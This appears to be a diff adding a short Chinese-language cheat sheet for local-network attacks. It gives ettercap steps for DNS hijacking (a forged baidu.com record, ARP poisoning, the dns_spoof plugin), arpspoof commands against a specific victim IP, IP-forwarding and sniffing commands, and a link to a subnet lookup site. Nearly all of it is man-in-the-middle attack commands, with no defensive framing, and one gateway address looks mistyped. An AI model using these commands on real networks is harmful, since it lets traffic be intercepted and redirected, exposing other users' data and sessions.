@@ -1,0 +1,21 @@
+dns劫持:
+1.vi /etc/ettercap/etter.dns
+	baidu.com A 192.168.1.1
+2.先选择sniff->unified sniff 
+  然后打开hosts->scan for hosts->host list
+3.选中主机add to 1
+4.mitm -> arp posining
+5.plugin->dns spoof  
+
+arp欺骗:
+arpspoof -i eth0 -t 192.168.0.7 192.68.0.1
+
+开启IP转发:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.0.7 192.68.0.1 然后在进行欺骗
+ettercap -Tq -i eth0 进行嗅探
+
+
+
+
+http://www.webscan.cc/ C段查询
